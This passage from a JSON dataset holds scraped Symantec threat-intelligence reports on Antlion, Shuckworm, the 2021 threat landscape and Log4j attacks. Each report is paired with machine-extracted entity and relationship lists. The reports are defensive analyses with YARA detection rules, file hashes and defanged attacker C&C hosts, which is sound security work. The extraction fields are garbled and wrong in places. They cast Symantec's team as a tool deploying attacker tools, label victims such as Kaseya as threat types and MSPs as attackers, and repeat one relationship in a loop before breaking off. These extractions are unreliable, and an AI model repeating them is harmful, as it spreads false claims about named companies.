living-off-the-land tools such as PowerShell, WMIC, ProcDump, LSASS, and PsExec. The legitimate AnyDesk tool was also abused by the attackers for remote access in one of the victim organizations. The attackers were also observed leveraging exploits such as CVE-2019-1458 for privilege escalation and remote scheduled tasks to execute their backdoor. CVE-2019-1458 is an elevation-of-privilege vulnerability that occurs in Windows when the Win32k component fails to properly handle objects in memory. Legitimate versions of WinRAR appear to have been exploited by the attackers for data exfiltration, while there is also evidence of data exfiltration via PowerShell, specifically using the BitsTransfer module to initiate an upload to attacker-controlled infrastructure. There is also evidence that the attackers likely automated the data collection process via batch scripts, while there is also evidence of instances where data was likely staged for further exfiltration, though it was not actually observed being exfiltrated from the network. In these instances, it appears the attackers were interested in collecting information from software pertaining to business contacts, investments, and smart card readers. The attackers spent a significant amount of time on victims’ networks, and deployed both custom and off-the-shelf malware. In one financial sector victim in Taiwan the attackers spent almost nine months on the victim network. The first suspicious activity on this victim network occurred in December 2020 when WMIC was used to execute two commands: The first command was used to list the computer name, description of processes, executable path, and process ID. The output was written to a suspicious file named htable.xsl under the wbem directory. The second command was used to collect information about the system, which was written out to the same file (htable.xsl). Information collected included: Five minutes after those commands were issued, WMIC was used to dump credentials: The commands listed above were all executed via Antlion’s custom xPack backdoor. Several days later, during the Christmas holiday period, the attackers returned over a period of a few days and executed the xPack backdoor again. They also executed an unknown VBS script via PsExec multiple times: On December 28, the attackers used xPack to launch a command prompt to dump credentials from several machines within the compromised organization with the following commands: Over the following couple of weeks, the attackers continued to return intermittently to launch the xPack backdoor or to dump credentials via the registry. Then, following a few weeks of inactivity, they become active on the infected network once again. The attackers used the xPack backdoor to launch a command prompt to execute the following commands: The above commands were used to firstly change the code page to 950, which is the Windows code page for Traditional Chinese. The attackers then executed 'query user' to list any logged-in users on the system, as well as running ‘tasklist’ to get a list of all the running processes on the system. They also tried to discover what processes were running, before listing all contents of the Desktop directory and the Users directory. After this, the attackers dumped credentials again via the registry. The attackers returned to the network a couple of weeks later and carried out largely the same activity. The attackers remained active on the network for March, April, and May 2021, intermittently returning to launch their xPack backdoor or dump credentials from the registry. Dumping credentials appears to be a main focus of the attackers, with them likely using these credentials to move laterally across the network to identify machines of interest from which they can exfiltrate data. The last activity on this network, after a gap of three months, occurred in August 2021, when the attackers returned and listed all available shares. They then dumped credentials from the registry and proceeded to collect account, group, and workstation configuration information. They then dumped credentials from the registry once again. This was the last activity seen on this network. Antlion is believed to have been involved in espionage activities since at least 2011, and this recent activity shows that it is still an actor to be aware of more than 10 years after it first appeared. The length of time that Antlion was able to spend on victim networks is notable, with the group able to spend several months on victim networks, affording plenty of time to seek out and exfiltrate potentially sensitive information from infected organizations. The targeting of Taiwan is perhaps unsurprising given we know Chinese state-backed groups tend to be interested in organizations in that region. For the latest protection updates, please visit theSymantec Protection Bulletin. If an IOC is malicious and the file is available to us, Symantec Endpoint products will detect and block that file. author = \"Symantec, a division of Broadcom\" hash = \"12425edb2c50eac79f06bf228cb2dd77bb1e847c4c4a2049c91e0c5b345df5f2\" $s1 = \"Length or Hash destoryed\" wide fullword $s2 = \"tag unmatched\" wide fullword $s3 = \"File size mismatch\" wide fullword $s4 = \"DESFile\" wide fullword $p1 = \"fomsal.Properties.Resources.resources\" wide fullword $p2 = \"xPack.Properties.Resources.resources\" wide fullword $p3 = \"foslta.Properties.Resources.resources\" wide fullword uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550 and (2 of ($s*) or any of ($p*)) author = \"Symantec, a division of Broadcom\" hash = \"390460900c318a9a5c9026208f9486af58b149d2ba98069007218973a6b0df66\" $s1 = \"C:\\\\Windows\\\\inf\\\\wdnvsc.inf\" wide fullword $s2 = \"PackService\" wide fullword $s3 = \"xPackSvc\" wide fullword $s4 = \"eG#!&5h8V$\" wide fullword uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550 and 3 of them author = \"Symantec, a division of Broadcom\" hash = \"e968e0d7e62fbc36ad95bc7b140cf7c32cd0f02fd6f4f914eeb7c7b87528cfe2\" hash = \"2a541a06929dd7d18ddbae2cb23d5455d0666af7bdcdf45b498d1130a8434632\" $s1 = {45 00 00 00 48 00 00 00 41 00 00 00 47 00 00 00 42 00 00 00 50 00 00 00 53 00 00 00 4C} // EHAGBPSL $s2 = {74 00 00 00 61 00 00 00 72 00 00 00 57 00 00 00 6F 00 00 00 6B} // tarWok $b1 = \"bnRtZ3M=\" fullword // ntmgs $b2 = \"TmV0d29yayBNYW5hZ2VtZW50IFNlcnZpY2U=\" fullword // Network Management Service $b3 = \"UHJvdmlkZXMgYWJpbGl0eSB0byBtYW5hZ2UgbmV0d29yayBvdmVyIHRoZSBuZXQgcHJvdG9jb2wu\" fullword // Provides ability to manage network over the net protocol. $b4 = \"bnRtZ3MuZG\" // ntmgs.dll / ntmgs.dat $b5 = \"aW1nMS5qcGc=\" fullword // img1.jpg $c1 = \"Wscms.nls\" fullword $c2 = \"Wscms.dat\" fullword $c3 = \"Wscms.dll\" fullword $c4 = \"Wscms.ini\" fullword $c5 = \"Images01.jpg\" fullword $e1 = \"StartWork\" fullword $e2 = \"ServiceMain\" fullword $h1 = {DD 9C BD 72} // CreateRemoteThread $h2 = {C0 97 E2 EF} // OpenProcess $h3 = {32 6D C7 D5} // RegisterServiceCtrlHandlerA $h4 = {A1 6A 3D D8} // WriteProcessMemory uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550 and all of ($e*) and (all of ($s*) or any of ($b*) or 3 of ($c*) or all of ($h*)) author = \"Symantec, a division of Broadcom\" hash = \"3db621cac1d026714356501f558b1847212c91169314c1d43bfc3a4798467d0d\" hash = \"789f0ec8e60fbc8645641a47bc821b11a4486f28892b6ce14f867a40247954ed\" $m1 = \"BKB_Test\" fullword $m2 = \"KLG_sd76bxds1N\" fullword $k1 = \"[%d/%02d/%02d %02d:%02d:%02d K-E-Y-L-O-G]\" fullword $k2 = \"[%d/%02d/%02d %02d:%02d:%02d C-L-I-P-B-D]\" fullword $k3 = \"< Title--%s-- >\" fullword $k4 = \"ImpersonateLoggedOnUser Error(%d)\" fullword $f1 = {55 73 65 72 ?? ?? ?? 00 00 00 ?? ?? ?? 6B 65 79 2E} // Userkey. $f2 = {55 73 65 72 ?? ?? ?? 00 00 00 ?? ?? ?? 64 61 74 2E} // Userdat. uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550 and (2 of ($k*) or (any of ($m*) and any of ($f*))) author = \"Symantec, a division of Broadcom\" description = \"BlackHole/BlackSwan / QuasarRAT/xClient loader\" hash = \"29d7b82f9ae7fa0dbaf2d18c4d38d18028d652ed1ccc0846e8c781b4015b5f78\" $s1 = \"Call %s.%s(\\\"%s\\\") => %d\" fullword wide $s2 = \"Assembly::CreateInstance failed w/hr 0x%08lx\" fullword wide $s4 = \"NULL == checkID hMutex\" fullword $s5 = \"checkID Mutex ERROR_ALREADY_EXISTS\" fullword $s6 = \"dllmain mutex ERROR_ALREADY_EXISTS\" fullword $x1 = \"xClient.Program\" fullword wide $x2 = \"LoadPayload\" fullword $m1 = \"SFZJ_Wh16gJGFKL\" ascii wide $m2 = \"d5129799-e543-4b8b-bb1b-e0cba81bccf8\" ascii wide $m3 = \"USA_HardBlack\" ascii wide $b1 = \"BlackHole.Slave.Program\" fullword wide $b2 = \"NuGet\\\\Config\" wide $b3 = \"VisualStudio.cfi\" wide $p = {E1 F6 3C AC AF AC AC AC A8 AC AC AC 53 53 AC AC 14} $t = \"0s+Nksjd1czZ1drJktPO24aEjISMtsvLy5LJzNjdyNnL1dLY08uS39PRhoSMhIy2jYyPkomNko2IjJKEiIaEjISM\" uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550 and 2 of ($s*) and (all of ($x*) or any of ($m*) or all of ($b*) or $p or $t) The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "extraction": {
      "raw_output": "Named Entities: (Antlion, Attacker), (xPack, Malware), (EternalBlue, Vulnerability), (SMB, Protocol), (mounted share, File), (proxy, Tool), (data, File), (manufacturing company, Organization)\nRelationships: (Antlion, uses, xPack), (Antlion, exploited, EternalBlue), (Antlion, interactsWith, SMB), (Antlion, browsedTheWebThrough, xPack), (Antlion, launched, data), (Antlion, attemptedToDownloadMalicious, data), (Antlion, associatedWith, manufacturing company)",
      "entities": [
        [
          "Antlion",
          "Attacker"
        ],
        [
          "xPack",
          "Malware"
        ],
        [
          "EternalBlue",
          "Vulnerability"
        ],
        [
          "SMB",
          "Protocol"
        ],
        [
          "mounted share",
          "File"
        ],
        [
          "proxy",
          "Tool"
        ],
        [
          "data",
          "File"
        ],
        [
          "manufacturing company",
          "Organization"
        ]
      ],
      "relationships": [
        [
          "Antlion",
          "uses",
          "xPack"
        ],
        [
          "Antlion",
          "exploited",
          "EternalBlue"
        ],
        [
          "Antlion",
          "interactsWith",
          "SMB"
        ],
        [
          "Antlion",
          "browsedTheWebThrough",
          "xPack"
        ],
        [
          "Antlion",
          "launched",
          "data"
        ],
        [
          "Antlion",
          "attemptedToDownloadMalicious",
          "data"
        ],
        [
          "Antlion",
          "associatedWith",
          "manufacturing company"
        ]
      ],
      "has_entities": true
    },
    "entity_count": 8,
    "relationship_count": 7
  },
  {
    "title": "shuckworm gamaredon espionage ukraine",
    "link": "https://www.security.com/threat-intelligence/shuckworm-gamaredon-espionage-ukraine",
    "content": "The Russia-linked Shuckworm group (aka Gamaredon, Armageddon) is continuing to conduct cyber-espionage attacks against targets in Ukraine. Over the course of recent months, Symantec’s Threat Hunter Team, a part ofBroadcom Software, has found evidence of attempted attacks against a number of organizations in the country. Active since at least 2013, Shuckworm specializes in cyber-espionage campaigns mainly against entities in Ukraine. The group is known to use phishing emails to distribute either freely available remote access tools, including Remote Manipulator System (RMS) and UltraVNC, or customized malware called Pterodo/Pteranodon to targets. Arecent reportpublished by The Security Service of Ukraine (SSU) noted that Shuckworm’s attacks have grown in sophistication in recent times, with attackers now using living-off-the-land tools to steal credentials and move laterally on victim networks. Recent activity seen by Symantec is consistent with that documented by SSU. Symantec observed Shuckworm activity on an organization in Ukraine, which began on July 14, 2021 and continued until August 18, 2021. The attack chain began with a malicious document, likely sent via a phishing email, which was opened by the user of the infected machine. The following is a breakdown of the attackers’ activity on the compromised computer. At 08:48 (local-time), a suspicious Word document is opened on the machine. Just five minutes after the document is opened, a suspicious command is also executed to launch a malicious VBS file (depended.lnk). This file is a known custom backdoor leveraged by Shuckworm (aka Pterodo). The backdoor is used to download and execute CSIDL_PROFILE\\searches\\depended.exe (94a78d5dce553832d61b59e0dda9ef2c33c10634ba4af3acb7fb7cf43be17a5b) from hxxp://92.242.62.131/wordpress.php?is=[REDACTED]. Two additional VBS scripts are observed being executed via depended.exe: A scheduled task is then created to likely ensure persistence between system reboots and to execute the dropped script. This ensures the VBS file deep-thoughted.ppt is executed every 10 minutes: Later, the attackers are observed executing an HTA file hosted on a remote server by abusing mshta.exe via depended.exe. The Mshta utility can execute Microsoft HTML Application (HTA) files and can be abused to bypass application control solutions. Since mshta.exe executes outside of Internet Explorer's security context, it also bypasses browser security settings. At the same time, a new variant of Pterodo is installed via depended.exe. Similarly to before, two additional scheduled tasks are created: The attackers continue to install variants of their backdoor and execute commands via scripts to ensure persistence: Directly after this, it appears the attackers test connectivity to a new C&C server via ping.exe: Once the connection is confirmed to be active, the attackers proceed to download another variant of their Pterodo backdoor and begin using the new C&C to download additional scripts and tools, as well as creating scheduled tasks to run every few minutes. At this point, the attackers cease activity. However, we continue to see commands being executed from the scheduled tasks for the remainder of July 14. At 05:28, the attackers return, and several additional variants of Pterodo are executed via CSIDL_COMMON_VIDEO\\planeta.exe (1ea3881d5d03214d6b7e37fb7b10221ef51782080a24cc3e275f42a3c1ea99c1). The attackers are then observed executing commands via planeta.exe: The above flushdns command may indicate that the attackers have updated the DNS records for their C&Cs, as we observed some of their tools use hard-coded domains. In this particular instance, the flushdns command was executed shortly before the attackers attempted to install additional backdoors that leveraged the same C&C. Later, another variant ofPterodo (deep-sided.fly) was executed and was used to download and execute a new file called deerskin.exe (ad1f796b3590fcee4aeecb321e45481cac5bc022500da2bdc79f768d08081a29). This file is a dropper for a VNC client. When executed, it pings google DNS (8.8.8.8) to test internet connectivity, then proceeds to drop a VNC client and establishes a connection to a remote C&C server controlled by the attackers: Two such files have been identified that perform the same actions: This VNC client appears to be the ultimate payload for this attack. Between July 29 and August 18 activity continued whereby we observed the attackers deploying multiple variants of their custom VBS backdoor along with executing VBS scripts and creating scheduled tasks similar to the ones detailed above. After August 18, no further suspicious activity was observed on this machine. During the course of this investigation, specifically post VNC client installation, a number of documents were opened from various locations on the compromised machine. It is unclear if this was legitimate user activity or the activity of the attackers attempting to collect and exfiltrate sensitive information. Titles of the documents accessed ranged from job descriptions to sensitive information pertaining to the targeted organization. Symantec investigations uncovered a total of seven files used by Shuckworm in recent attacks. All seven files are 7-zip SFX self-extracting binaries, a format used previously in Shuckworm attacks. Upon execution, the file named descend.exe (0d4b8e244f19a009cee50252f81da4a2f481da9ddb9b204ef61448d56340c137) drops a VBS file which, in turn, drops a second VBS file in the following locations: It then creates the following task: The file deerbrook.ppt (b46e872375b3c910fb589ab75bf130f7e276c4bcd913705a140ac76d9d373c9e) VBS file contacts a command-and-control (C&C) server at deep-pitched.enarto.ru. If the C&C server is available, a HTTP POST request is sent to download a payload, which is saved in the %USERPROFILE% folder as deep-sunken.tmp then renamed to deep-sunken.exe and executed. The binary is then deleted. Upon execution, the file deep-sunken.exe (02c41bddd087522ce60f9376e499dcee6259853dcb50ddad70cb3ef8dd77c200) drops the following files on the compromised computer: It then creates the following task: It then connects to a C&C server (arianat.ru) to download another payload using wget: The baby.dat file is a VBS file that executes baby.cmd, which then downloads and executes the payload from the C&C server. The vb_baby.vbs file renames the downloaded payload from baby.php to backed.exe. The downloaded payload (backed.exe) could not be retrieved. However, the following files were also obtained during our investigation: The file z4z05jn4.egf.exe (fd9a9dd9c73088d1ffdea85540ee671d8abb6b5ab37d66a760b2350951c784d0) is similar to the previous file (deep-sunken.exe) but with different folders, file names, and C&C server (iruto.ru). Once executed, the file defiant.exe (a20e38bacc979a5aa18f1954df1a2c0558ba23cdc1503af0ad1021c330f1e455) drops a VBS file in the following locations: It then creates the following task: The dropped file deep-versed.nls (817901df616c77dd1e5694e3d75aebb3a52464c23a06820517108c74edd07fbc) downloads a payload from a C&C server (deep-toned.chehalo.ru) and saves it as deep-green.exe in the following location: The file deep-green.exe (1ddc9b873fe4f4c8cf8978b6b1bb0e4d9dc07e60ba188ac6a5ad8f162d2a1e8f) contains an UltraVNC binary, which upon execution connects to a repeater (mucoris.ru:5612) using the following command line: UltraVNC is an open-source remote-administration/remote-desktop-software utility. A second file named deep-green.exe (f6c56a51c1f0139036e80a517a6634d4d87d05cce17c4ca5adc1055b42bf03aa) contain a Process Explorer (procexp) binary. Process Explorer is a freeware task manager and system monitor for Microsoft Windows. A third file called deep-green.exe (de5a53a3b75e3e730755af09e3cacb7e6d171fc9b1853a7200e5dfb9044ab20a) is similar to descend.exe (0d4b8e244f19a009cee50252f81da4a2f481da9ddb9b204ef61448d56340c137) just with different file names and C&C server (deer-lick.chehalo.ru). The fourth and final file named deep-green.exe (d15a7e69769f4727f7b522995a17a0206ac9450cfb0dfe1fc98fd32272ee5ba7) drops a VBS file in the following location: It then creates the following task: The MediaConvertor.dat file searches for removable drives and creates a .lnk file with the following command: Analysis of the many indicators of compromise (IOCs) uncovered during our investigations have revealed the following patterns, which may be of use when defending networks from Shuckworm attacks: According to aNovember 2021 reportfrom the SSU, since 2014 the Shuckworm group has been responsible for over 5,000 attacks against more than 1,500 Ukrainian government systems. As evidenced by Symantec’s recent investigations into attempted Shuckworm attacks against a number of organizations in Ukraine, this activity shows little sign of abating. For the latest protection updates, please visit theSymantec Protection Bulletin. The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "extraction": {
      "raw_output": "Named Entities: (Shuckworm, Attacker), (Malicious Document, File), (Word Document, File), (Command, Technique), (Symantec's Threat Hunter Team, Tool), (The Security Service of Ukraine (SSU), Organization), (living-off-the-land tools, Tool), (Pteranodon, Malware)\nRelationships: (Shuckworm, uses, Malicious Document), (Shuckworm, executes, Command), (Symantec's Threat Hunter Team, deployed, living-off-the-land tools), (Symantec's Threat Hunter Team, usedBy, The Security Service of Ukraine (SSU)), (Symantec's Threat Hunter Team, observes, Shuckworm activity), (Symantec's Threat Hunter Team, observed, compromised computer), (Symantec's Threat Hunter Team, observed, Shuckworm activity on the compromised computer), (Symantec's Threat Hunter Team, observed, Shuckworm activity on the compromised computer), (Symantec's Threat Hunter Team, observed, Shuckworm activity on the compromised computer), (Symantec's Threat Hunter Team, observed, Shuckworm activity on the compromised computer), (Symantec's Threat Hunter Team, observed, Shuckworm activity on the compromised computer), (Symantec's Threat Hunter Team, observed, Shuckworm activity on the compromised computer), (Symantec's Threat Hunter Team, observed, Shuckworm activity on the",
      "entities": [
        [
          "Shuckworm",
          "Attacker"
        ],
        [
          "Malicious Document",
          "File"
        ],
        [
          "Word Document",
          "File"
        ],
        [
          "Command",
          "Technique"
        ],
        [
          "Symantec's Threat Hunter Team",
          "Tool"
        ],
        [
          "living-off-the-land tools",
          "Tool"
        ],
        [
          "Pteranodon",
          "Malware"
        ]
      ],
      "relationships": [
        [
          "Shuckworm",
          "uses",
          "Malicious Document"
        ],
        [
          "Shuckworm",
          "executes",
          "Command"
        ],
        [
          "Symantec's Threat Hunter Team",
          "deployed",
          "living-off-the-land tools"
        ],
        [
          "Symantec's Threat Hunter Team",
          "usedBy",
          "The Security Service of Ukraine (SSU"
        ],
        [
          "Symantec's Threat Hunter Team",
          "observes",
          "Shuckworm activity"
        ],
        [
          "Symantec's Threat Hunter Team",
          "observed",
          "compromised computer"
        ],
        [
          "Symantec's Threat Hunter Team",
          "observed",
          "Shuckworm activity on the compromised computer"
        ],
        [
          "Symantec's Threat Hunter Team",
          "observed",
          "Shuckworm activity on the compromised computer"
        ],
        [
          "Symantec's Threat Hunter Team",
          "observed",
          "Shuckworm activity on the compromised computer"
        ],
        [
          "Symantec's Threat Hunter Team",
          "observed",
          "Shuckworm activity on the compromised computer"
        ],
        [
          "Symantec's Threat Hunter Team",
          "observed",
          "Shuckworm activity on the compromised computer"
        ],
        [
          "Symantec's Threat Hunter Team",
          "observed",
          "Shuckworm activity on the compromised computer"
        ]
      ],
      "has_entities": true
    },
    "entity_count": 7,
    "relationship_count": 12
  },
  {
    "title": "threat landscape 2021",
    "link": "https://www.security.com/threat-intelligence/threat-landscape-2021",
    "content": "From the evolving ransomware ecosystem to attacks against critical infrastructure, Symantec looks back over thecyber-security trends that shaped 2021. A new whitepaper from Symantec, a division ofBroadcom Software, takes a look back at the some of the major threats that shaped the threat landscape during 2021. Ransomware was arguably the most significant threat facing organizations in 2021, with some ransomware operators departing the scene, new ones entering the fold, and business models and tactics being refined to make targeted ransomware more lucrative than ever. However, ransomware wasn’t the only threat, with supply chain attacks, an increase in attackers exploiting vulnerabilities in public-facing applications, and attacks against critical infrastructure also shaping the threat landscape in 2021. Ransomware, or more precisely, targeted ransomware, was the most dominant threat making headlines throughout 2021. Ransomware gangs moved towards targeting entities with a broad network of downstream users. These upstream entities included large software developers and organizations involved in critical infrastructure, as seen in the Kaseya and Colonial Pipeline attacks. Targeting managed service providers (MSPs) also gave attackers the opportunity to infect potentially thousands of victims by compromising just one. While as in previous years, the total number of ransomware attacks detected and blocked by Symantec in 2021 continues to trend downwards, this doesn’t mean ransomware activity is becoming less of a threat. This downward trend is due to a significant decrease in relatively unsophisticated, indiscriminate ransomware attacks and threat actors shifting their focus to large organizations where they can cause more disruption and demand higher ransom amounts. The number of these targeted ransomware attacks rose from around 80 in January 2020 to more than 200 in September 2021. This increase in targeted ransomware attacks is partly fueled by two relatively recent developments: the rise of so-called initial access brokers (IABs), threat actors that sell access to compromised networks to the highest bidder, which in recent times has become targeted ransomware gangs; and a rise in ransomware-as-a-service (RaaS), a subscription-based model that lets individuals or gangs known as affiliates use already-developed ransomware threats in their attacks. The RaaS model greatly increases the number of adversaries an organization faces, with multiple attackers now attempting to deliver the same ransomware, but using different tactics, techniques, and procedures (TTPs). Due to the growth in the RaaS market, affiliates now have the option to migrate to another ransomware should their current one shut down. In addition,Symantec has observedaffiliates using two different strains of ransomware in a very short space of time and, in some cases, during the same attack. This suggests that some affiliates have enough of a reputation to not be locked in to an exclusive agreement with one ransomware operator. While as in previous years, the total number of ransomware attacks detected and blocked by Symantec in 2021 continues to trend downwards, this doesn’t mean ransomware activity is becoming less of a threat. Botnets are now also playing a key role in ransomware attacks, with many older financial fraud botnets having been repurposed to spread ransomware. In some cases, it is the same threat actor behind both the ransomware and the botnet. For example, Trickbot is believed to be controlled by the Miner group (aka Wizard Spider) which is also linked to both the Ryuk and Conti ransomware. Another takeaway from the year concerning ransomware included operators targeting industries that were hardest hit by the COVID-19 pandemic. A prime example of this was theattack against Ireland’s national health service, the Health Service Executive, by the Conti (aka Miner, Wizard Spider) ransomware operators. Last year also saw the REvil (aka Leafroller, Sodinokibi) ransomware’s infrastructure compromised by law enforcement, whichgained control of at least some of REvil’s servers. However, as with previous efforts to halt the gang’s activity, REvil is likely to reappear in some form following the most recent takedown effort. In 2021, targeted ransomware groups also began threatening victims in order to prevent them from sharing details of attacks with media or ransomware negotiating firms. Both the Conti and Grief ransomware gangs said that they would publish stolen victim data or delete decryption keys if transcripts or screenshots of ransom negotiations were publicly shared. The announcement was likely prompted by a growing number of media reports containing details of ransom negotiations. Other threat groups also employed similar tactics, including Ragnar Locker and a new ransomware threat called Yanluowang, which wasuncovered by Symantec’s Threat Hunter Team. Software supply chain attacks, due to their potential to disrupt large sections of society and business, remain a concern for governments and businesses around the world. Two significant supply chain attacks in the headlines from last year included the SolarWinds hack and the Kaseya attack. While the SolarWinds attack occurred in late 2020 it continued to make waves well into 2021. The attackers responsible for the attack, the Russia-backed Nobelium (aka Hagensia) group, has remained active. A new backdoor threat (Tomiris) likely developed by Nobelium was uncovered in September. The malware has similarities to the SUNSHUTTLE second-stage malware used by Nobelium in the SolarWinds attack. While another post-exploitation backdoor (FoggyWeb) was also linked to Nobelium. The malware is designed to steal sensitive data from compromised Active Directory Federation Services (AD FS) servers. The attack against IT management software maker Kaseya, which was carried out by the REvil ransomware operators, impacted multiple managed service providers (MSPs) that used the company’s software. While Kaseya reported that approximately 60 of their customers were impacted by the attack, those customers were MSPs with numerous customers themselves. The estimated number of organizations compromised as a result of the supply chain attack was 1,500. The attack was carried out during the U.S. July 4 holiday weekend, likely in an attempt to have the attack go unnoticed for as long as possible due to many employees being on leave. This is a tactic that is increasingly being adopted by threat actors. While the Kaseya and SolarWinds attacks are the most significant, they are by no means the only supply chain attacks in recent times. According toa reportfrom the Identity Theft Resource Center (ITRC), supply chain attacks are increasing, with 793,000 more individuals being affected by such attacks in the first three quarters of 2021 than in the entire 12 months of 2020. Last year saw an increase in attackers exploiting vulnerabilities in public-facing applications in order to gain access to organizations’ networks. While in some cases attackers are focusing on zero-day bugs, more frequently they are looking towards recently patched vulnerabilities and the hunt for unpatched systems. A notable example of this was the critical vulnerabilities in Microsoft Exchange Server, collectively known as ProxyLogon. The flaws were patched in early March 2021, with Microsoft saying at the time that the bugs were being exploited by an advanced persistent threat (APT) group it dubbed Hafnium (Symantec tracks this group as Ant) in targeted attacks. However, shortly after the ProxyLogon vulnerabilities were disclosed, other threat actors began exploiting them. This quick adoption was also highlighted when another string of vulnerabilities in Microsoft Exchange Server, dubbed ProxyShell, were publicly revealed in August 2021. Exploit attempts targeting these bugs began immediately, with Symantec data showing more than 200,000 exploit attempts targeting this set of vulnerabilities in August 2021 alone. Other vulnerabilities in public-facing applications that were frequently exploited by threat actors in 2021 include flaws in VPN products from Pulse Secure (CVE 2019-11510), Fortinet (CVE-2018-13379), and SonicWall (CVE-2021-20016), and vulnerabilities in Accellion’s File Transfer Appliance (FTA) software (CVE-2021-27101, CVE-2021-27102, CVE-2021-27103, and CVE-2021-27104). Cyber-attacks against critical national infrastructure (CNI) can be some of the most impactful as they can potentially affect everyone in society. This was highlighted in May 2021, when the Colonial Pipeline, the largest petroleum pipeline in the U.S., suffered a ransomware attack that impacted equipment managing the pipeline. The attack was carried out by the Russia-based DarkSide ransomware gang. While the ransom was paid just hours after the attack took place, decryption was slow and the pipeline’s operation was halted, causing fuel shortages, price increases, and panic buying across a number of U.S. states. The Colonial Pipeline attack was not an isolated incident, with news also emerging in July 2021 that Chinese state-sponsored threat actors hadtargeted 23 U.S. oil and gas pipeline operatorsin attack campaigns between 2011 and 2013. U.S. officials announced that the aim of the actors behind the attacks was to “help China develop cyber attack capabilities against U.S. pipelines to physically damage pipelines or disrupt pipeline operations.” Attacks against CNI show no signs of stopping, with the number of network-based detections related to attacks targeting CNI trending upward (Figure 3). These attacks are blocked by Symantec’s Intrusion Prevention System (IPS) technologies. Malicious activity blocked on the network saw a decline after a peak in July 2021, however, overall the numbers are trending upward. In terms of regions that see the most activity targeting the networks of CNI organizations, the U.S. is bounds ahead of others on the list with 69% of all activity seen there. This was just a sample of the content in our latest whitepaper.Read the full paperfor more insights into the threat landscape of 2021. The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "extraction": {
      "raw_output": "Named Entities: (ransomware, Threat Type), (targeted ransomware, Threat Type), (Kaseya, Threat Type), (Colonial Pipeline, Threat Type), (managed service provider, Attacker), (Symantec, Company), (Critical Infrastructure, Threat Type), (software developer, Attacker), (public-facing application, Vulnerability), (critical infrastructure, Threat Type), (MSP, Attacker)\nRelationships: (ransomware, isDominant, targeted ransomware), (Kaseya, isTargetedAgainst, upstream entity), (Colonial Pipeline, isTargetedAgainst, upstream entity), (managed service provider, isAttackedBy, ransomware), (Symantec, detectsAndBlocks, ransomware), (Symantec, company, Broadcom Software), (Critical Infrastructure, isAffectedBy, ransomware), (software developer, isAttackedBy, ransomware), (public-facing application, isExploitedBy, ransomware), (critical infrastructure, isAffectedBy, ransomware), (MSP, isAttackedBy, ransomware)",
      "entities": [
        [
          "ransomware",
          "Threat Type"
        ],
        [
          "targeted ransomware",
          "Threat Type"
        ],
        [
          "Kaseya",
          "Threat Type"
        ],
        [
          "Colonial Pipeline",
          "Threat Type"
        ],
        [
          "managed service provider",
          "Attacker"
        ],
        [
          "Symantec",
          "Company"
        ],
        [
          "Critical Infrastructure",
          "Threat Type"
        ],
        [
          "software developer",
          "Attacker"
        ],
        [
          "public-facing application",
          "Vulnerability"
        ],
        [
          "critical infrastructure",
          "Threat Type"
        ],
        [
          "MSP",
          "Attacker"
        ]
      ],
      "relationships": [
        [
          "ransomware",
          "isDominant",
          "targeted ransomware"
        ],
        [
          "Kaseya",
          "isTargetedAgainst",
          "upstream entity"
        ],
        [
          "Colonial Pipeline",
          "isTargetedAgainst",
          "upstream entity"
        ],
        [
          "managed service provider",
          "isAttackedBy",
          "ransomware"
        ],
        [
          "Symantec",
          "detectsAndBlocks",
          "ransomware"
        ],
        [
          "Symantec",
          "company",
          "Broadcom Software"
        ],
        [
          "Critical Infrastructure",
          "isAffectedBy",
          "ransomware"
        ],
        [
          "software developer",
          "isAttackedBy",
          "ransomware"
        ],
        [
          "public-facing application",
          "isExploitedBy",
          "ransomware"
        ],
        [
          "critical infrastructure",
          "isAffectedBy",
          "ransomware"
        ],
        [
          "MSP",
          "isAttackedBy",
          "ransomware"
        ]
      ],
      "has_entities": true
    },
    "entity_count": 11,
    "relationship_count": 11
  },
  {
    "title": "log4j vulnerabilities attacks",
    "link": "https://www.security.com/threat-intelligence/log4j-vulnerabilities-attacks",
    "content": "Apache Log4j is a Java-based logging utility. The library’s main role is to log information related to security and performance to make error debugging easier and to enable applications to run smoothly. The library is part of the Apache Logging Services, a project of the Apache Software Foundation. Log4j has been making headlines recently after the public disclosure of three critical vulnerabilities in the utility which can lead to remote code execution (CVE-2021-44228 and CVE-2021-45046) and denial of service (CVE-2021-45105). The initial remote code execution vulnerability (CVE-2021-44228) has been dubbed Log4Shell and has dominated cyber-security news ever since it was publicly disclosed on December 9. The vulnerability has been exploited to deploy a plethora of payloads like coin miners, Dridex malware, and even ransomware such as Conti. Symantec, a division ofBroadcom Software, has observed numerous variations in attack requests primarily aimed at evading detection. Some sample attack requests can be seen in Table 1. Attackers are predominantly using the LDAP and RMI protocols to download malicious payloads. We have also recorded vulnerability scans using protocols such as IIOP, DNS, HTTP, NIS etc. Muhstik Botnet -We have observed attackers downloading malicious Java class files as a part of Log4shell exploitation. The malicious class file downloads a shell file with the content shown in Figure 1. The shell script attempts to download Executable and Linkable Format (ELF) files and execute them, which leads to the installation of the Muhstik botnet. XMRig miner -We have also observed attackers installing the XMRig cryptocurrency miner as a part of post-exploitation activity related to Log4shell exploitation. The miner is downloaded via a simple PowerShell command (Figure 2). The miner is executed with the command shown in Figure 3. Malicious class file backdoor -We have also seen attacks attempt to download a malicious Java class file that acts as a backdoor. The class file has code to listen for and execute commands from the attacker (Figure 4). Reverse Bash shell –Attackers were alsoobserved deploying reverse shells on vulnerable machines (Figure 5). Other publicly reported payloads include the Khonsari and Conti ransomware threats, the Orcus remote access Trojan (RAT), and the Dridex malware, among others. For the period between December 9 (when the first Log4j vulnerability was disclosed) and December 21, Symantec’s Intrusion Prevention System (IPS) blocked more than 93 million 